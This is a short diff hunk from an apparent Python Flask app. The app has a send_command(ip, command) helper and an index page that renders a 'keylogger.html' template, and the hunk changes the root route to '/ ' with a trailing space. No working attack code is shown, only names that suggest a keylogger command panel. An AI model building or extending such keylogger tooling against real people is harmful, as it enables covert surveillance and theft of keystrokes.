@@ -22,7 +22,7 @@ def send_command(ip, command):
     except Exception as e:
         return f"Error: {str(e)}"
 
-@app.route("/")
+@app.route("/ ")
 def index():
     return render_template("keylogger.html")
 
